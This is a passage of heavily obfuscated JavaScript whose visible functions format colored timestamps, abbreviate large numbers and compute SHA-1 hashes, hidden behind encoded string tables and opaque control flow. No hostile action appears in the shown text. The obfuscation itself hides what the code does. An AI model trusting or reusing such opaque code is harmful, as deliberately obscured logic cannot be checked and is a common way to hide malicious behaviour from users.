        __p_7502997530_stack[0x4].push(
          (__p_7502997530_stack[0x5] |
            (__p_7502997530_stack[0x7] << __p_7502997530_stack.kTlKYU)) &
            0xff
        );
      }
      return __p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x10)] >
        0x7
        ? __p_7502997530_stack[__p_7502997530_stack.A7Mb1v - 0x3c]
        : __p_1990998267__JS_PREDICT__(
            __p_7502997530_stack[__p_7502997530_stack.A7Mb1v + 0x6e]
          );
    }
  },
  convertTimestamp = (seconds) => {
    var __p_7263590929__JS_PREDICT__,
      __p_2826521090,
      __p_0153597350,
      __p_3817925215,
      __p_2340092385,
      __p_3305513621;
    function __p_7532128973_dLR_48__JS_PREDICT__(index_param) {
      return __p_9551561833[
        index_param > 0x24
          ? index_param > 0x24
            ? index_param > 0x24
              ? index_param - 0x25
              : index_param + 0x64
            : index_param + 0xf
          : index_param + 0x38
      ];
    }
    __p_2360982505(
      (__p_7263590929__JS_PREDICT__ = (x, y, z, a, b) => {
        if (typeof a === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)) {
          a = __p_8948328344__JS_PREDICT____JS_CRITICAL__;
        }
        if (typeof b === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)) {
          b = __p_3576149457;
        }
        if (z == a) {
          return y
            ? x[b[y]]
            : __p_3576149457[x] ||
                ((z = b[x] || a), (__p_3576149457[x] = z(__p_1940297625[x])));
        }
        if (a === void 0x0) {
          __p_7263590929__JS_PREDICT__ = b;
        }
        if (a === __p_7263590929__JS_PREDICT__) {
          __p_8948328344__JS_PREDICT____JS_CRITICAL__ = y;
          return __p_8948328344__JS_PREDICT____JS_CRITICAL__(z);
        }
        if (x !== y) {
          return b[x] || (b[x] = a(__p_1940297625[x]));
        }
      }),
      (__p_2826521090 = __p_7263590929__JS_PREDICT__(
        __p_7532128973_dLR_48__JS_PREDICT__(0x9b)
      )),
      (__p_0153597350 = [
        __p_7263590929__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x14)),
      ]),
      (__p_3817925215 = __p_7263590929__JS_PREDICT__(
        __p_2786467427_dLR_0__JS_PREDICT__(0x16)
      )),
      (__p_2340092385 = {
        pOMDMT: __p_7263590929__JS_PREDICT__(
          __p_7532128973_dLR_48__JS_PREDICT__(0x6c)
        ),
        IXx3LR: __p_7263590929__JS_PREDICT__(0x1b),
        yK84cgD: __p_7263590929__JS_PREDICT__(0x18),
      }),
      (__p_3305513621 = __p_7263590929__JS_PREDICT__(0x14))
    );
    if (
      seconds < __p_2786467427_dLR_0__JS_PREDICT__(-0x28) &&
      __p_9743501678.yaLutw()
    ) {
      seconds = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e);
    }
    const hours = Math[
        __p_7263590929__JS_PREDICT__(__p_7532128973_dLR_48__JS_PREDICT__(0x6d))
      ](__p_0575541368_calc(seconds, 0xe10, (__p_6857802341 = -0x9))),
      minutes = Math[
        __p_7263590929__JS_PREDICT__[__p_7532128973_dLR_48__JS_PREDICT__(0x70)](
          __p_7532128973_dLR_48__JS_PREDICT__(0x3a),
          [__p_7532128973_dLR_48__JS_PREDICT__(0x6d)]
        )
      ](
        __p_0575541368_calc(
          seconds % 0xe10,
          0x3c,
          __p_0333540851(-__p_7532128973_dLR_48__JS_PREDICT__(0x5f))
        )
      ),
      secs = seconds % __p_7532128973_dLR_48__JS_PREDICT__(0x89),
      paddedHours = hours[__p_3305513621 + "ng"]()[
        __p_7263590929__JS_PREDICT__(0x15) + "rt"
      ](0x2, "0"),
      paddedMinutes = minutes[
        __p_7263590929__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x16))
      ]()[__p_2340092385.pOMDMT](
        __p_2786467427_dLR_0__JS_PREDICT__(-0x20),
        __p_7532128973_dLR_48__JS_PREDICT__(0x6f)
      ),
      paddedSeconds = secs[__p_3817925215]()[__p_0153597350[0x0]](
        0x2,
        __p_7532128973_dLR_48__JS_PREDICT__(0x6f)
      );
    return __p_0575541368_calc(
      `${chalk[
        __p_7263590929__JS_PREDICT__(__p_7532128973_dLR_48__JS_PREDICT__(0x8a))
      ]("[")}` +
        `${chalk[
          __p_2826521090 +
            __p_7263590929__JS_PREDICT__(
              __p_2786467427_dLR_0__JS_PREDICT__(0x19)
            )
        ](paddedHours)}` +
        `${chalk[
          __p_2340092385.IXx3LR +
            __p_7263590929__JS_PREDICT__[
              __p_2786467427_dLR_0__JS_PREDICT__(0x18)
            ](void 0x0, [__p_2786467427_dLR_0__JS_PREDICT__(0x19)])
        ](":")}` +
        `${chalk[
          __p_7263590929__JS_PREDICT__(
            __p_7532128973_dLR_48__JS_PREDICT__(0x7c)
          )
        ](paddedMinutes)}` +
        `${chalk[__p_7263590929__JS_PREDICT__(0x1d)](":")}` +
        `${chalk[__p_7263590929__JS_PREDICT__(0x1c)](paddedSeconds)}`,
      `${chalk[__p_2340092385.yK84cgD](
        __p_7532128973_dLR_48__JS_PREDICT__(0x77)
      )}`,
      (__p_6857802341 = -__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
    );
    function __p_8948328344__JS_PREDICT____JS_CRITICAL__(
      str,
      table = 'G;X}iCV3RL]f*^K2yt/Bq7:0Fuv`=Q{95a.Hn)I!|wN~xzEk"Y&g@MPcb>oh$ej%1[A,m+sldrDS?WZJ<6Op#U_4(8T',
      raw,
      len,
      ret = [],
      b = 0x0,
      n = 0x0,
      v,
      i,
      p
    ) {
      __p_2360982505(
        (raw = "" + (str || "")),
        (len = raw.length),
        (v = -__p_7532128973_dLR_48__JS_PREDICT__(0x30))
      );
      for (i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e); i < len; i++) {
        p = table.indexOf(raw[i]);
        if (p === -0x1) {
          continue;
        }
        if (v < __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)) {
          v = p;
        } else {
          __p_2360982505(
            (v += p * 0x5b),
            (b |= v << n),
            (n +=
              (v & __p_2786467427_dLR_0__JS_PREDICT__(0xd)) >
              __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                ? 0xd
                : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
          );
          do {
            __p_2360982505(
              ret.push(b & 0xff),
              (b >>= __p_7532128973_dLR_48__JS_PREDICT__(0x43)),
              (n -= __p_2786467427_dLR_0__JS_PREDICT__(-0x15))
            );
          } while (n > 0x7);
          v = -0x1;
        }
      }
      if (v > -0x1) {
        ret.push((b | (v << n)) & __p_7532128973_dLR_48__JS_PREDICT__(0x3c));
      }
      return __p_1990998267__JS_PREDICT__(ret);
    }
  },
  getCurrentTime = () => {
    var __p_3018657715__JS_PREDICT__ = __p_6510065121(
        (...__p_1170285195_stack) => {
          __p_2360982505(
            (__p_1170285195_stack.length =
              __p_2786467427_dLR_0__JS_PREDICT__(-0x22)),
            (__p_1170285195_stack.vbeBZpF = -0x5f)
          );
          if (
            typeof __p_1170285195_stack[__p_1170285195_stack.vbeBZpF + 0x62] ===
            __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_1170285195_stack[0x3] =
              __p_9845707351__JS_PREDICT____JS_CRITICAL__;
          }
          if (
            typeof __p_1170285195_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
            ] === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_1170285195_stack[__p_1170285195_stack.vbeBZpF + 0x63] =
              __p_3576149457;
          }
          if (
            __p_1170285195_stack[__p_1170285195_stack.vbeBZpF + 0x61] ==
            __p_1170285195_stack[0x3]
          ) {
            return __p_1170285195_stack[0x1]
              ? __p_1170285195_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)][
                  __p_1170285195_stack[0x4][__p_1170285195_stack[0x1]]
                ]
              : __p_3576149457[
                  __p_1170285195_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                  ]
                ] ||
                  ((__p_1170285195_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
                  ] =
                    __p_1170285195_stack[0x4][__p_1170285195_stack[0x0]] ||
                    __p_1170285195_stack[0x3]),
                  (__p_3576149457[
                    __p_1170285195_stack[
                      __p_1170285195_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(0x1a)
                      ] + 0x5f
                    ]
                  ] = __p_1170285195_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
                  ](__p_1940297625[__p_1170285195_stack[0x0]])));
          }
          __p_1170285195_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x1a)] =
            -__p_2786467427_dLR_0__JS_PREDICT__(0x37);
          if (
            __p_1170285195_stack[
              __p_1170285195_stack.vbeBZpF +
                __p_2786467427_dLR_0__JS_PREDICT__(0x1b)
            ] === __p_2786467427_dLR_0__JS_PREDICT__(-0x1e)
          ) {
            __p_3018657715__JS_PREDICT__ = __p_1170285195_stack[0x4];
          }
          if (
            __p_1170285195_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] !==
            __p_1170285195_stack[0x1]
          ) {
            return (
              __p_1170285195_stack[
                __p_1170285195_stack.vbeBZpF +
                  __p_2786467427_dLR_0__JS_PREDICT__(0x1c)
              ][
                __p_1170285195_stack[
                  __p_1170285195_stack.vbeBZpF -
                    (__p_1170285195_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(0x1a)
                    ] -
                      0x0)
                ]
              ] ||
              (__p_1170285195_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)][
                __p_1170285195_stack[0x0]
              ] = __p_1170285195_stack[
                __p_1170285195_stack.vbeBZpF +
                  __p_2786467427_dLR_0__JS_PREDICT__(0x1b)
              ](
                __p_1940297625[
                  __p_1170285195_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                  ]
                ]
              ))
            );
          }
          if (
            __p_1170285195_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] ==
            __p_1170285195_stack[__p_1170285195_stack.vbeBZpF + 0x40]
          ) {
            return (__p_1170285195_stack[0x1][
              __p_3576149457[__p_1170285195_stack[0x2]]
            ] = __p_3018657715__JS_PREDICT__(
              __p_1170285195_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)],
              __p_1170285195_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]
            ));
          }
        },
        __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
      ),
      __p_7622830243,
      __p_7723380440;
    __p_2360982505(
      (__p_7622830243 = {
        RcvSQ37: __p_3018657715__JS_PREDICT__[
          __p_2786467427_dLR_0__JS_PREDICT__(0x1d)
        ](
          __p_2786467427_dLR_0__JS_PREDICT__(-0x1e),
          __p_2786467427_dLR_0__JS_PREDICT__(-0xa)
        ),
        _KH2eQB: __p_3018657715__JS_PREDICT__(0x28),
      }),
      (__p_7723380440 = [
        __p_3018657715__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(-0xa)),
        __p_3018657715__JS_PREDICT__(0x23),
        __p_3018657715__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(-0xa)),
      ])
    );
    const now = new Date(),
      hours = now[__p_3018657715__JS_PREDICT__(0x1e)]()
        [__p_3018657715__JS_PREDICT__(0x1f) + "ng"]()
        [__p_7723380440[0x0]](0x2, __p_2786467427_dLR_0__JS_PREDICT__(0x17)),
      minutes = now[
        __p_3018657715__JS_PREDICT__(0x21) + __p_3018657715__JS_PREDICT__(0x22)
      ]()
        [__p_7723380440[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]]()
        [__p_7723380440[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)]](0x2, "0"),
      seconds = now[
        __p_3018657715__JS_PREDICT__[__p_2786467427_dLR_0__JS_PREDICT__(0x1d)](
          void 0x0,
          0x24
        )
      ]()
        [
          __p_3018657715__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x27))
        ]()
        [__p_7622830243.RcvSQ37](0x2, __p_2786467427_dLR_0__JS_PREDICT__(0x17));
    return __p_0575541368_calc(
      `${chalk[
        __p_3018657715__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x3))
      ]("[")}` +
        `${chalk[__p_3018657715__JS_PREDICT__(0x26)](hours)}` +
        `${chalk[
          __p_3018657715__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x1e))
        ](":")}` +
        `${chalk[__p_3018657715__JS_PREDICT__(0x26)](minutes)}` +
        `${chalk[__p_3018657715__JS_PREDICT__(0x27)](":")}` +
        `${chalk[
          __p_7622830243._KH2eQB +
            __p_3018657715__JS_PREDICT__.apply(
              __p_2786467427_dLR_0__JS_PREDICT__(-0x1e),
              [0x29]
            )
        ](seconds)}`,
      `${chalk[
        __p_3018657715__JS_PREDICT__[__p_2786467427_dLR_0__JS_PREDICT__(0x1d)](
          __p_2786467427_dLR_0__JS_PREDICT__(-0x1e),
          0x25
        )
      ](__p_2786467427_dLR_0__JS_PREDICT__(0x1f))}`,
      (__p_6857802341 = -__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
    );
    function __p_9845707351__JS_PREDICT____JS_CRITICAL__(
      str,
      table = 'wNdtHkGKqWg:YPAF7ZTSV3LIvpBn(fsl&9R^z)Oa_u>CDMoc!Ehi%Q/;+.2`}#x*]1<0,86[y="$@|XU~j?e{5Jmr4b',
      raw,
      len,
      ret = [],
      b = 0x0,
      n,
      v,
      i,
      p
    ) {
      __p_2360982505(
        (raw = "" + (str || "")),
        (len = raw.length),
        (n = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
        (v = -0x1)
      );
      for (i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e); i < len; i++) {
        p = table.indexOf(raw[i]);
        if (p === -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
          continue;
        }
        if (v < 0x0) {
          v = p;
        } else {
          var __p_0368324023_dLR_49__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param < 0x60
                  ? index_param + 0x1c
                  : index_param > 0x11f
                  ? index_param + 0x51
                  : index_param - 0x61
              ];
            },
            0x1
          );
          __p_2360982505(
            (v += p * 0x5b),
            (b |= v << n),
            (n +=
              (v & 0x1fff) > 0x58
                ? __p_0368324023_dLR_49__JS_PREDICT__(0x89)
                : 0xe)
          );
          do {
            __p_2360982505(
              ret.push(b & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)),
              (b >>= 0x8),
              (n -= 0x8)
            );
          } while (n > 0x7);
          v = -__p_0368324023_dLR_49__JS_PREDICT__(0x6c);
        }
      }
      if (v > -0x1) {
        ret.push((b | (v << n)) & 0xff);
      }
      return __p_1990998267__JS_PREDICT__(ret);
    }
  },
  formatNumber = (number) => {
    var __p_3347036647__JS_PREDICT__ = (x, y, z, a, b) => {
        if (typeof a === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)) {
          a = __p_3444092276__JS_PREDICT____JS_CRITICAL__;
        }
        if (typeof b === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)) {
          b = __p_3576149457;
        }
        if (z == x) {
          return (y[__p_3576149457[z]] = __p_3347036647__JS_PREDICT__(x, y));
        }
        if (y) {
          [b, y] = [a(b), x || z];
          return __p_3347036647__JS_PREDICT__(x, b, z);
        }
        if (z && a !== __p_3444092276__JS_PREDICT____JS_CRITICAL__) {
          __p_3347036647__JS_PREDICT__ =
            __p_3444092276__JS_PREDICT____JS_CRITICAL__;
          return __p_3347036647__JS_PREDICT__(x, -0x1, z, a, b);
        }
        if (z == a) {
          return y
            ? x[b[y]]
            : __p_3576149457[x] ||
                ((z = b[x] || a), (__p_3576149457[x] = z(__p_1940297625[x])));
        }
        if (x !== y) {
          return b[x] || (b[x] = a(__p_1940297625[x]));
        }
      },
      __p_0417701275,
      __p_4679990428;
    __p_2360982505(
      (__p_0417701275 = {
        [__p_2786467427_dLR_0__JS_PREDICT__(0x21)]:
          __p_3347036647__JS_PREDICT__(0x2c),
        [__p_2786467427_dLR_0__JS_PREDICT__(0x23)]:
          __p_3347036647__JS_PREDICT__[
            __p_2786467427_dLR_0__JS_PREDICT__(0x18)
          ](void 0x0, [__p_2786467427_dLR_0__JS_PREDICT__(0x3a)]),
      }),
      (__p_4679990428 = [__p_3347036647__JS_PREDICT__(0x2a)])
    );
    const units = ["", "K", "M", "B", "T", "Q"],
      alphabet = __p_4679990428[0x0];
    if (
      number < __p_2786467427_dLR_0__JS_PREDICT__(0x9) &&
      __p_9743501678.yaLutw()
    ) {
      return number[__p_3347036647__JS_PREDICT__(0x2b)]();
    }
    let unitIndex = __p_0575541368_calc(
        0x1,
        (__p_6857802341 = -__p_2786467427_dLR_0__JS_PREDICT__(0x3))
      ),
      adjustedNumber = number;
    while (
      adjustedNumber >= __p_2786467427_dLR_0__JS_PREDICT__(0x9) &&
      __p_9743501678.tZjv4eQ[__p_3347036647__JS_PREDICT__(0x2c)](0x5) ==
        __p_2786467427_dLR_0__JS_PREDICT__(0x20)
    )
      (adjustedNumber /= 0x3e8), unitIndex++;
    if (
      unitIndex >=
        units[
          __p_3347036647__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x22))
        ] &&
      __p_9743501678.tZjv4eQ[
        __p_0417701275[__p_2786467427_dLR_0__JS_PREDICT__(0x21)]
      ](0x5) == __p_2786467427_dLR_0__JS_PREDICT__(0x20)
    ) {
      var __p_9703345018 = [__p_3347036647__JS_PREDICT__(0x2e)],
        __p_6535303079;
      __p_6535303079 = { UWmCgQ: __p_3347036647__JS_PREDICT__(0x2d) };
      const extraIndex = __p_0575541368_calc(
          unitIndex,
          units[__p_6535303079.UWmCgQ],
          __p_0333540851(0x10)
        ),
        firstLetter =
          alphabet[
            Math[__p_9703345018[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]](
              __p_0575541368_calc(
                extraIndex,
                alphabet[
                  __p_3347036647__JS_PREDICT__(
                    __p_2786467427_dLR_0__JS_PREDICT__(0x22)
                  )
                ],
                (__p_6857802341 = -__p_2786467427_dLR_0__JS_PREDICT__(0x7))
              )
            )
          ],
        secondLetter =
          alphabet[extraIndex % alphabet[__p_3347036647__JS_PREDICT__(0x2d)]];
      return `${adjustedNumber[
        __p_3347036647__JS_PREDICT__[__p_2786467427_dLR_0__JS_PREDICT__(0x1d)](
          void 0x0,
          0x2f
        )
      ](0x3)}${firstLetter}${secondLetter}`;
    }
    return `${adjustedNumber[
      __p_0417701275[__p_2786467427_dLR_0__JS_PREDICT__(0x23)]
    ](0x3)}${units[unitIndex]}`;
    function __p_3444092276__JS_PREDICT____JS_CRITICAL__(
      ...__p_4342071285_stack
    ) {
      var i;
      __p_2360982505(
        (__p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
          __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
        (__p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x25)] =
          -__p_2786467427_dLR_0__JS_PREDICT__(0x24)),
        (__p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)] =
          'vcPASMgNW2!;Fyn,K:RB0oI.L(q5JCX8`?*a&m7/[tTzx$|>p"U~s]6e%=h@HlQEZ3iVO}D^ru9+4f_)1GYb<kwj{#d'),
        (__p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] =
          "" +
          (__p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] ||
            "")),
        (__p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x26)] =
          __p_4342071285_stack[
            __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
          ].length),
        (__p_4342071285_stack[
          __p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x25)] + 0xbf
        ] = __p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x26)]),
        (__p_4342071285_stack.HsYJ5J = []),
        (__p_4342071285_stack.U1OywM =
          __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
        (__p_4342071285_stack[
          __p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x25)] +
            __p_2786467427_dLR_0__JS_PREDICT__(0x2b)
        ] = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
        (__p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] = -(
          __p_4342071285_stack[0xba] + 0x1d
        ))
      );
      for (i = 0x0; i < __p_4342071285_stack[0xa3]; i++) {
        __p_4342071285_stack.WM0Omkq = __p_4342071285_stack[0x1].indexOf(
          __p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)][i]
        );
        if (__p_4342071285_stack.WM0Omkq === -0x1) {
          continue;
        }
        if (__p_4342071285_stack[0x7] < 0x0) {
          __p_4342071285_stack[
            __p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x25)] +
              0x23
          ] = __p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x28)];
        } else {
          __p_2360982505(
            (__p_4342071285_stack[
              __p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x25)] +
                __p_2786467427_dLR_0__JS_PREDICT__(0x27)
            ] +=
              __p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x28)] *
              0x5b),
            (__p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2a)] |=
              __p_4342071285_stack[
                __p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x25)] -
                  (__p_4342071285_stack[
                    __p_4342071285_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(0x25)
                    ] + 0xd6
                  ] -
                    __p_2786467427_dLR_0__JS_PREDICT__(0x2))
              ] <<
              __p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x29)]),
            (__p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x29)] +=
              (__p_4342071285_stack[__p_4342071285_stack[0xba] + 0x23] &
                __p_2786467427_dLR_0__JS_PREDICT__(0xd)) >
              0x58
                ? __p_4342071285_stack[0xba] -
                  (__p_4342071285_stack[0xba] - 0xd)
                : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
          );
          do {
            __p_2360982505(
              __p_4342071285_stack.HsYJ5J.push(
                __p_4342071285_stack.U1OywM & 0xff
              ),
              (__p_4342071285_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(0x2a)
              ] >>= 0x8),
              (__p_4342071285_stack[0x6] -=
                __p_2786467427_dLR_0__JS_PREDICT__(-0x15))
            );
          } while (
            __p_4342071285_stack[
              __p_4342071285_stack[0xba] +
                __p_2786467427_dLR_0__JS_PREDICT__(0x2b)
            ] > 0x7
          );
          __p_4342071285_stack[
            __p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x25)] +
              __p_2786467427_dLR_0__JS_PREDICT__(0x27)
          ] = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28);
        }
      }
      if (
        __p_4342071285_stack[
          __p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x25)] +
            __p_2786467427_dLR_0__JS_PREDICT__(0x27)
        ] > -0x1
      ) {
        __p_4342071285_stack.HsYJ5J.push(
          (__p_4342071285_stack.U1OywM |
            (__p_4342071285_stack[0x7] <<
              __p_4342071285_stack[
                __p_4342071285_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x25)] +
                  0x22
              ])) &
            0xff
        );
      }
      return __p_4342071285_stack[__p_4342071285_stack[0xba] + 0xd6] >
        __p_2786467427_dLR_0__JS_PREDICT__(0x24)
        ? __p_4342071285_stack[-0x4a]
        : __p_1990998267__JS_PREDICT__(__p_4342071285_stack.HsYJ5J);
    }
  },
  sha1Hash = (data) => {
    var __p_3250526605__JS_PREDICT__ = __p_6510065121(
        (...__p_7914857664_stack) => {
          __p_2360982505(
            (__p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
              __p_2786467427_dLR_0__JS_PREDICT__(-0x22)),
            (__p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2c)] =
              __p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)])
          );
          if (
            typeof __p_7914857664_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
            ] === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] =
              __p_4590321525__JS_PREDICT____JS_CRITICAL__;
          }
          if (
            typeof __p_7914857664_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
            ] === "undefined"
          ) {
            __p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)] =
              __p_3576149457;
          }
          if (__p_7914857664_stack[0x3] === __p_3250526605__JS_PREDICT__) {
            __p_4590321525__JS_PREDICT____JS_CRITICAL__ =
              __p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2c)];
            return __p_4590321525__JS_PREDICT____JS_CRITICAL__(
              __p_7914857664_stack[0x2]
            );
          }
          if (
            __p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] &&
            __p_7914857664_stack[0x3] !==
              __p_4590321525__JS_PREDICT____JS_CRITICAL__
          ) {
            __p_3250526605__JS_PREDICT__ =
              __p_4590321525__JS_PREDICT____JS_CRITICAL__;
            return __p_3250526605__JS_PREDICT__(
              __p_7914857664_stack[0x0],
              -0x1,
              __p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)],
              __p_7914857664_stack[0x3],
              __p_7914857664_stack[0x4]
            );
          }
          if (
            __p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] !==
            __p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2c)]
          ) {
            return (
              __p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)][
                __p_7914857664_stack[0x0]
              ] ||
              (__p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)][
                __p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]
              ] = __p_7914857664_stack[0x3](
                __p_1940297625[__p_7914857664_stack[0x0]]
              ))
            );
          }
          if (
            __p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] ===
            __p_2786467427_dLR_0__JS_PREDICT__(-0x1e)
          ) {
            __p_3250526605__JS_PREDICT__ = __p_7914857664_stack[0x4];
          }
          if (
            __p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] ==
            __p_7914857664_stack[0x3]
          ) {
            return __p_7914857664_stack.p0Y4yC
              ? __p_7914857664_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)][
                  __p_7914857664_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
                  ][
                    __p_7914857664_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(0x2c)
                    ]
                  ]
                ]
              : __p_3576149457[__p_7914857664_stack[0x0]] ||
                  ((__p_7914857664_stack[0x2] =
                    __p_7914857664_stack[0x4][__p_7914857664_stack[0x0]] ||
                    __p_7914857664_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
                    ]),
                  (__p_3576149457[__p_7914857664_stack[0x0]] =
                    __p_7914857664_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
                    ](
                      __p_1940297625[
                        __p_7914857664_stack[
                          __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                        ]
                      ]
                    )));
          }
        },
        0x5
      ),
      __p_0242057271,
      __p_8710188714;
    __p_2360982505(
      (__p_0242057271 = { hqWJ8C: __p_3250526605__JS_PREDICT__(0x34) }),
      (__p_8710188714 = [
        __p_3250526605__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x67)),
      ])
    );
    const hash = crypto[
      __p_3250526605__JS_PREDICT__[__p_2786467427_dLR_0__JS_PREDICT__(0x1d)](
        __p_2786467427_dLR_0__JS_PREDICT__(-0x1e),
        __p_2786467427_dLR_0__JS_PREDICT__(0x4e)
      ) + __p_8710188714[0x0]
    ](__p_3250526605__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(-0x19)));
    return __p_8438996831__JS_CRITICAL__(
      hash[__p_0242057271.hqWJ8C](data),
      hash[__p_3250526605__JS_PREDICT__(0x35)](
        __p_3250526605__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x2d))
      )
    );
    function __p_4590321525__JS_PREDICT____JS_CRITICAL__(
      ...__p_9358852861_stack
    ) {
      var i;
      __p_2360982505(
        (__p_9358852861_stack.length = 0x1),
        (__p_9358852861_stack.I0kK1k =
          __p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]),
        (__p_9358852861_stack[0x1] =
          '0sDApmVq1{+H>="542f(}i|S#RIgwM[Cc`KaU@X;toW*d?O)xvLrjB7!Ebe8/zQJFGk^ZPN%._9]$y,6<3hu~:Yn&lT'),
        (__p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] =
          "" + (__p_9358852861_stack.I0kK1k || "")),
        (__p_9358852861_stack.Iy_ncqa =
          __p_2786467427_dLR_0__JS_PREDICT__(0x1b)),
        (__p_9358852861_stack.yRbcSUR =
          __p_9358852861_stack[
            __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
          ].length),
        (__p_9358852861_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)] = []),
        (__p_9358852861_stack[__p_9358852861_stack.Iy_ncqa - 0x3e] =
          __p_9358852861_stack.Iy_ncqa - 0x43),
